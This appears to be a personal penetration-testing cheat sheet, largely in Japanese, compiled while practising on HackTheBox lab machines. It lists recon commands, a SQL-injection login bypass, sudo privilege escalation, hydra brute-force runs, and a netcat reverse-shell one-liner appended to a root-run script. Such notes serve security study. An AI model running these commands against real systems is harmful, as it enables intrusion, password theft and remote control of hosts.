
# My Cheat Sheet

## 探索

### nmap
```
nmap -sC -sV -O -v -oV 10.10.10.17
```
複数の ip レンジ and open status のスキャン
```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```
脆弱性スキャン
```
nmap -sV --script vuln 10.10.10.1
```

### nmap tips

https://muchipopo.com/ctf/cheatsheet-oscp/

### windows でポートスキャン
```
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.206.151", $_)) "TCP port $_ is open"} 2>$null
```

### AutoRecon
```
┌──(kali㉿kali)-[~/Documents/Beep]
└─$ python3 ../AutoRecon/autorecon.py 10.10.10.7 
```

https://github.com/Tib3rius/AutoRecon

## ssh
ssh でエラーが出る場合  
```/etc/ssh/ssh_config```  

```
HOST *
KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
IgnoreUnknown UseKeychain,AddKeysToAgent
UseKeychain yes
AddKeysToAgent yes
Ciphers +3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc
StrictHostKeyChecking no
UserKnownHostsFile /dev/null
HostKeyAlgorithms ssh-dss,ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```
## dns 53
```
└─$ dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.18.16-1-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 235 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Dec 08 21:28:42 EST 2023
;; XFR size: 7 records (messages 1, bytes 203)

```
## NetBIOS 139
nbtscan
```
kali@kali:~$ sudo nbtscan -r 192.168.50.0/24
Doing NBT name scan for addresses from 192.168.50.0/24

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
192.168.50.124   SAMBA            <server>  SAMBA            00:00:00:00:00:00
192.168.50.134   SAMBAWEB         <server>  SAMBAWEB         00:00:00:00:00:00
```

## http/https 

### http 探索
```
gobuster dir -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**https** の場合は **-k** が必要

```
gobuster dir -u https://beep.htb/ -w /usr/share/wordlists/dirb/common.txt -k
```

```
feroxbuster -u http://shocker.htb -f -n
feroxbuster -u http://shocker.htb/cgi-bin/ -x sh,cgi,pl
```
```
dirb http://10.10.10.56/cgi-bin/ -X .sh,.pl,.txt,.php,.py
```
## SQLi

ログイン画面で利用  
ユーザ名、パスワードに **admin'or'1'='1** を利用  

### WordPress
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```
### Word Press username 列挙
```
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

### Word Press admin page

```
https://brainfuck.htb/wp-admin/
```

## exploit code 

### searchsploit 検索
```
searchsploit wordpress plugin wp support
```

### searchsploit 詳細表示
```
searchsploit -x 41006.txt
```
### searchsploit Download
```
searchsploit -m 37637
```

### sudo -l
root 権限で実行できるファイルが確認できる
```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh <<<<< HERE
```

## root 権限

### perl -e 'exec "/bin/sh";'
https://gtfobins.github.io/gtfobins/perl/
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
whoami
root
```

### netcat /tmp/f
sudo -l で root 権限で実行できるファイルを見つけ、以下コマンドで netcat できるようにする。
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tmp/f' | tee -a monitor.sh
```

```
└─$ nc -lvnp 8443
listening on [any] 8443 ...
```

## Tips

### URL エンコーディング
https://www.w3schools.com/tags/ref_urlencode.asp

### reverse_shells
https://gist.github.com/sckalath/67a59eb4955f1f9aedde

### Reverse Shell Cheat Sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Reverse Shell Generator
https://www.revshells.com/

### which
リバースシェルで対象サーバで使えるコマンドを確認するコマンド
```
┌──(rnozaka㉿kali)-[~/Documents]
└─$ which nc
/usr/bin/nc
```

### ハッシュ解読
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
### データベース調査
接続
```
www-data@cronos:/var/www/admin$ mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 42
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
ID:root/PW:root の場合
```
┌──(rnozaka㉿kali)-[~/Documents]
└─$ mysql -u root -p'root' -h 192.168.248.16 -P 3306
```

一覧表示
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)
```
データベース選択
```
mysql> use admin
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
テーブル表示
```
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```
```
mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

windows の場合の接続方法
```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

### ブルートフォース
***http***
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
```

```
┌──(kali㉿kali)-[~/Documents/Nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:15:01
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:Invalid
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:15:14                            
```
***https***
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
```
```
┌──(kali㉿kali)-[~/Documents/Nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:23:54
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123                                                                            
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:24:38
```

### kali から windows RDP
```
xfreerdp /u:student /p:lab /v:192.168.206.152
```
### grep
下5行表示
```
grep -A 5 -n kitaura smb.conf
```

上5行表示
```
grep -B 5 -n kitaura smb.conf　
```

### Mac キーボード 設定
command -> caps lock 無効化
<img width="814" alt="image" src="https://github.com/ryuji-jp/htb/assets/61535783/b368a2ee-f314-485a-a892-9a0e42749f7f">

### nc
```
└─$ nc -lvnp 8443
listening on [any] 8443 ...
```
```
-z: このオプションは、接続を確立せずにスキャンするために使用されます。
-v: 冗長オプションはスキャン結果を出力します。
-n: このオプションは、DNS ルックアップと警告をスキップするために使用されます。
```

### BurpSuite インストール
インストール方法  
https://qiita.com/natsuki7293/items/74ab17ad3ad1d8a8ec3d  
ダウンロードサイト  
https://portswigger.net/burp/releases/professional-community-2023-10-1-1?requestededition=professional&requestedplatform=  

### pwsh インストール
```
% brew install --cask powershell  
<中略>
installer: Package name is PowerShell - 7.2.1
installer: Installing at base path /
installer: The install was successful.
🍺  powershell was successfully installed!
```
https://note.com/iboy1204/n/n99f2994e8f96
